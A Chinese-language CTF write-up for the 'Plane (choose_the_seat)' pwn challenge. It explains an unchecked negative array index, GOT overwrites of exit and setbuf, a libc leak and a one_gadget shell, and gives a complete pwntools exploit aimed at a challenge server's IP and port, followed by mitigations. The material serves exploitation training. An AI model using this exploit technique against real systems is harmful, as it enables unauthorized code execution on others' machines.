# Plane - PWN Challenge 详细解题报告

## 题目信息
- **题目名称**: Plane (choose_the_seat)
- **题目类型**: PWN (二进制漏洞利用)
- **难度**: 中等
- **靶机地址**: 110.42.47.169:35689

## 题目分析

### 1. 程序功能分析
通过运行程序，我们可以看到：
```
Welcome to the plane (0 to 9) please choose seat
```
程序要求用户选择一个座位号（0-9），然后要求输入姓名。

### 2. 二进制文件分析
使用 `checksec` 命令查看保护机制：
```bash powershell
checksec chall
```
结果显示：
- **Arch**: amd64-64-little
- **RELRO**: Partial RELRO
- **Stack**: No canary found
- **NX**: NX enabled
- **PIE**: No PIE (0x400000)

**保护机制解读**：
- `Partial RELRO`：部分重定位只读，GOT表可写
- `No canary`：没有栈保护，可以栈溢出
- `NX enabled`：栈不可执行
- `No PIE`：程序基地址固定，没有地址随机化

### 3. 漏洞发现
通过逆向分析或动态调试，我们发现：
1. 程序在读取座位号时使用了**有符号整数**
2. 但在数组访问时**没有进行边界检查**
3. 这导致了**整数溢出漏洞**

当我们输入负数时，可以访问到程序的其他内存区域，特别是**GOT表**。

## 漏洞利用思路

### 利用原理
1. **整数溢出**：通过输入负数绕过边界检查
2. **GOT表劫持**：修改GOT表中的函数指针
3. **信息泄露**：泄露libc基地址
4. **代码执行**：通过one_gadget获取shell

### 攻击步骤
1. 修改 `exit@got` 为 `main` 函数地址，实现程序循环
2. 泄露libc基地址（通过修改 `setbuf@got`）
3. 计算 `one_gadget` 地址
4. 修改 `exit@got` 为 `one_gadget` 地址
5. 触发 `exit` 函数，执行 `one_gadget` 获取shell

## 详细利用过程

### 第一步：修改exit@got为main函数
```python
# 第一步：通过整数溢出修改exit函数的GOT表为main函数
# 这样程序就不会退出，可以多次利用
p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')

# 输入-6来实现整数溢出，修改exit@got为main
p.sendline(b'-6')

p.recvuntil(b'you can input you name\n')
# 将exit@got修改为main函数地址，实现无限循环
p.send(p64(elf.sym["main"]))
```

**解释**：
- `-6` 是一个负数，会导致整数溢出
- 通过计算偏移，`-6` 对应访问 `exit@got` 的位置
- 我们将 `exit@got` 修改为 `main` 函数地址
- 这样当程序调用 `exit()` 时，实际上会跳转到 `main` 函数，实现程序循环

### 第二步：泄露libc基地址
```python
# 第二步：泄露libc基地址
# 通过修改setbuf@got的最低位来泄露libc地址
p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')
p.sendline(b'-8')  # 修改setbuf@got

p.recvuntil(b'you can input you name\n')
p.send(p8(0xd0))  # 只修改最低位

# 接收泄露的libc地址
p.recv(13)
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_leak - libc.sym['setbuf']
```

**解释**：
- `-8` 对应访问 `setbuf@got` 的位置
- 我们只修改 `setbuf@got` 的最低位为 `0xd0`
- 这会改变 `setbuf` 函数的地址，使其指向一个会输出地址的函数
- 通过程序的输出，我们可以获取到泄露的地址
- 用泄露的地址减去 `setbuf` 在libc中的偏移，得到libc基地址

### 第三步：计算one_gadget地址
```python
# 第三步：计算one_gadget地址
# 根据libc-2.31.so的one_gadget偏移
one_gadget = libc_base + 0xe3b01  # 这个偏移需要根据具体libc版本调整

log.info(f"one_gadget: {hex(one_gadget)}")
```

**解释**：
- `one_gadget` 是libc中的一个特殊gadget，可以直接执行 `execve("/bin/sh", NULL, NULL)`
- 使用 `one_gadget` 工具可以找到具体的偏移地址
- `0xe3b01` 是 `libc-2.31.so` 中一个可用的one_gadget偏移

### 第四步：修改exit@got为one_gadget
```python
# 第四步：修改exit@got为one_gadget
p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')
p.sendline(b'-6')  # 再次修改exit@got

p.recvuntil(b'you can input you name\n')
p.send(p64(one_gadget))

# 触发exit函数，执行one_gadget
p.interactive()
```

**解释**：
- 再次使用 `-6` 访问 `exit@got`
- 这次我们将 `exit@got` 修改为 `one_gadget` 的地址
- 当程序调用 `exit()` 时，会执行 `one_gadget`，获取shell
- `p.interactive()` 进入交互模式，可以执行shell命令

## 完整Exploit代码

```python
#!/usr/bin/env python3
from pwn import *
from struct import pack
import sys

# 根据参考文章分析，这是一个choose_the_seat题目
# 主要漏洞是整数溢出，通过输入负数来绕过bounds check
# 然后修改GOT表实现攻击

context.log_level = 'debug'
context(os='linux', arch='amd64')

def debug(c=0):
    if c:
        gdb.attach(p, c)
    else:
        gdb.attach(p)

# 连接到远程服务器
p = remote("110.42.47.169", 35689)
# p = process("./chall")  # 本地测试
elf = ELF("./chall")
libc = ELF("./libc-2.31.so")

def exploit():
    # 第一步：通过整数溢出修改exit函数的GOT表为main函数
    # 这样程序就不会退出，可以多次利用
    p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')
    
    # 输入-6来实现整数溢出，修改exit@got为main
    p.sendline(b'-6')
    
    p.recvuntil(b'you can input you name\n')
    # 将exit@got修改为main函数地址，实现无限循环
    p.send(p64(elf.sym["main"]))
    
    # 第二步：泄露libc基地址
    # 通过修改setbuf@got的最低位来泄露libc地址
    p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')
    p.sendline(b'-8')  # 修改setbuf@got
    
    p.recvuntil(b'you can input you name\n')
    p.send(p8(0xd0))  # 只修改最低位
    
    # 接收泄露的libc地址
    p.recv(13)
    libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = libc_leak - libc.sym['setbuf']
    
    log.info(f"libc_base: {hex(libc_base)}")
    
    # 第三步：计算one_gadget地址
    # 根据libc-2.31.so的one_gadget偏移
    one_gadget = libc_base + 0xe3b01  # 这个偏移需要根据具体libc版本调整
    
    log.info(f"one_gadget: {hex(one_gadget)}")
    
    # 第四步：修改exit@got为one_gadget
    p.recvuntil(b'Welcome to the plane (0 to 9) please choose seat')
    p.sendline(b'-6')  # 再次修改exit@got
    
    p.recvuntil(b'you can input you name\n')
    p.send(p64(one_gadget))
    
    # 触发exit函数，执行one_gadget
    p.interactive()

if __name__ == "__main__":
    exploit()
```

## 关键技术点解析

### 1. 整数溢出原理
```c
// 伪代码示例
int seat_choice;
scanf("%d", &seat_choice);  // 读取有符号整数
seats[seat_choice] = user_input;  // 没有边界检查
```
当输入负数时，`seats[seat_choice]` 会访问到数组之前的内存区域。

### 2. GOT表劫持
GOT (Global Offset Table) 存储了动态链接库函数的地址。通过修改GOT表项，我们可以劫持函数调用。

### 3. One_gadget
One_gadget是libc中的一个特殊gadget，可以直接执行 `execve("/bin/sh", NULL, NULL)`。使用工具可以找到：
```bash
one_gadget libc-2.31.so
```

### 4. 地址泄露技术
通过修改函数指针的最低位，我们可以让函数指向一个会输出地址信息的位置，从而泄露libc基地址。

## 防护措施

1. **输入验证**：对用户输入进行严格的边界检查
2. **使用无符号整数**：避免负数输入
3. **开启完整RELRO**：使GOT表只读
4. **开启PIE**：地址随机化
5. **使用现代编译器**：自动添加边界检查

## 总结

这道题目是一个典型的整数溢出+GOT劫持的PWN题目，主要考察：
1. 整数溢出漏洞的发现和利用
2. GOT表劫持技术
3. 信息泄露技术
4. One_gadget的使用

通过这道题目，我们学习了如何从漏洞发现到最终利用的完整过程，这对于理解二进制漏洞利用非常有帮助。

## 参考资料
- [参考文章](https://blog.csdn.net/2303_79366759/article/details/139122934)
- [PWN入门教程](https://pwn.college/)
- [pwntools文档](https://docs.pwntools.com/)
